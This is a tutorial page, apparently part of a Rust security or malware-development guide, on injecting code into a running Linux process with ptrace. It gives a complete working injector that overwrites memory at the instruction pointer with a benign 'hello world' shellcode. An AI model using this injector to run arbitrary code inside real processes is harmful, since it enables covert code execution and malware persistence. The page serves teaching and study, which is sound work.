+++
title = "Injection with PTRACE"
weight = 1
+++

In this section, we'll look at how the `ptrace` system call on Linux can be used to inject code into a running process to make it execute the code you want.

The ptrace system call allows you to attach yourself to a process and control its execution, modify its memory space and consult its registers. It is used by debuggers such as GDB. Attaching to a process with this system call is called tracing.

Here, we're going to modify the RIP register and replace the process instructions with our own.

The target process is the following program, i.e. it is possible to attack any process as long as [permissions allow](https://www.kernel.org/doc/html/v5.10//admin-guide/LSM/Yama.html).

This is our target program, `my_process.c`:
```rust
#include <stdio.h>
#include <unistd.h>

int main() {
	while(1) {
		puts("Hi !");
		sleep(1);
	}
}
```

```bash
>>> gcc my_process.c -o my_process
>>> ./my_process
Hi !
Hi !
...
```

To use the `ptrace` call, we'll use the **Nix** library with the `ptrace` _feature_.

```bash
cargo add nix --features=ptrace
```

Our Cargo.toml file contains the following dependencies:
```toml
[dependencies]
nix = { version = "0.27.1", features = ["ptrace"] }
```

The Nix crate provides the various parameters available in `ptrace` in separate functions available in the `nix::sys::ptrace` module.

Note that all these functions take as their first parameter the PID of the process on which the action is to be performed, and the call to the attach function must have already been called on the target process.

Here's our instruction injection program:
```rust
use nix::sys::ptrace::{attach, detach, getregs, setregs, write};
use nix::sys::wait::{waitpid, WaitPidFlag};
use nix::unistd::Pid;
use std::ffi::c_void;
use std::fs;

fn get_pid_from_name_attachable(process_name: &str) -> Option<pid> {
    let pid_dirs = fs::read_dir("/proc").unwrap();
    for dir_raw in pid_dirs {
        if dir_raw.is_err() {
            continue;
        }
        let dir = dir_raw.unwrap();
        let dir_pid = dir.file_name().to_str().unwrap().parse::<u32>();
        if dir_pid.is_err() {
            // we only want PIDs
            continue;
        }
        let dir_pid = dir_pid.unwrap();
        match fs::read(format!("/proc/{}/comm", dir_pid)) {
            Ok(res) => {
                let comm_raw = String::from_utf8(res).unwrap();
                let comm = comm_raw.strip_suffix('\n').unwrap();
                if comm == process_name
                    && attach(Pid::from_raw(dir_pid as i32)).is_ok()
                // Check if it has the same name and is attachable
                {
                    return Some(Pid::from_raw(dir_pid as i32));
                }
            }
            Err(_) => continue,
        }
    }
    return None;
}

fn main() {
    let shellcode = include_bytes!("../shellcode.bin");
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 2 {
        eprintln!("Usage: {} <target process name>", args.get(0).unwrap());
        return 
    }

    let process_name = args.get(1).unwrap(); // Target process

    // Wait for the process to change to a stopped state, then dump its registers
    let target_pid = match get_pid_from_name_attachable(process_name) {
        Some(v) => v,
        None => {
            panic!("Could not get process '{}''s pid or could not attach to it", process_name);
        }
    };

    // Wait for the SIGSTOP signal sent to the process when the attach function was called
    if let Err(error) = waitpid(target_pid, Some(WaitPidFlag::WUNTRACED)) {
        panic!(
            "Could not wait for the {} to change state: {}",
            process_name, error
        );
    }

    // Get registers to extract RIP
    let mut registers = match getregs(target_pid) {
        Ok(value) => value,
        Err(error) => panic!(
            "Could not get registers for process '{}': {}",
            process_name, error
        ),
    };

    let mut writer_cursor = registers.rip;
    // advance RIP of 2 to launch our shellcode
    registers.rip += 2;

    // Re-inject new RIP inside the process
    if let Err(error) = setregs(target_pid, registers) {
        panic!(
            "Unable to reset process '{}''s registers: {}",
            process_name, error
        );
    }

    // Write shellcode inside the memory of the process
    for byte in shellcode {
        match unsafe {
            write(
                target_pid,
                writer_cursor as *mut c_void,
                *byte as *mut c_void,
            )
        } {
            Err(error) => panic!("Unable to write into process '{}' byte {}: {}",process_name, byte, error),
            Ok(_) => writer_cursor += 1
        }
    }

    // we detach ourself from the process, allowing it to continue running
    if let Err(error) = detach(target_pid, None) {
        panic!(
            "Unable to detach from process '{}': {}",
            process_name, error
        );
    }
    // here the target process has resumed execution on the shellcode
}
```

This program works as follows:

1. Retrieve the PID of the target process by searching all folders in `/proc/` where the name is a PID and the process invocation command is the name of the process you are looking for, which must be attachable with `ptrace`.
2. Wait for the process to be attached by waiting for it to be stopped with waitpid, the `SIGSTOP` signal indicating that the process is attached.
3. Get the process registers with `getregs`, then get `RIP` in a variable, adding 2 to `RIP` so that our instructions are executed directly after we detach from the process.
4. We write our instructions to the location pointed to by `RIP`.
5. We detach from the process so that it can resume its course of execution.

In this example, we're going to execute instructions to display "hello world", here's its hexdump:
```
00000000: 488d 3513 0000 006a 0158 6a0c 5a48 89c7  H.5....j.Xj.ZH..
00000010: 0f05 6a3c 5831 ff0f 05c3 6865 6c6c 6f20  ..j<X1....hello 
00000020: 776f 726c 640a                           world.
```

When we run our program on the "my\_process" process, we can see that the string "hello world" is displayed:
```
>>> cargo build
>>> sudo ./target/debug/ptrace_inject my_process
```

```
>>> ./my_process
Hi !
Hi !
Hi !
...
Hi !
Hi !
hello world
>>> 
```
